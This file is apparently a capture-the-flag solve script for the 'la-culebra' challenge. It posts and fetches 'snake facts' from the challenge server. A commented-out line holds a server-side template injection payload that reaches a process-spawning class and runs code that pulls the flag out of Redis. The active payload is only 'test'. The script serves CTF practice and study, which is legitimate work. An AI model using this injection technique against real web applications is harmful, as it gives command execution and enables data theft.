# crimist: la-culebra solve script
import httpx

endpoint = 'http://la-culebra.ctf.maplebacon.org:9090'
# payload = "{{().__class__.__base__.__subclasses__()[394]([\"python3\", \"-c\", \"import redis; import base64; red = redis.Redis(host='localhost', port=6379); flag = red.get('flag'); red.set('ok', base64.b64encode(flag[1:]))\"])}}"
payload = "test"

r = httpx.post(f'{endpoint}/newsnakefact',
               json={'snake': 'noodle', 'description': payload},
               timeout=10)
print(f'[{r.status_code}] {r.text}')

r = httpx.get(f'{endpoint}/getsnakefact/noodle', timeout=10)
print(f'[{r.status_code}] {r.text}')

r = httpx.get(f'{endpoint}/getsnakefact/ok', timeout=10)
print(f'[{r.status_code}] {r.text}')
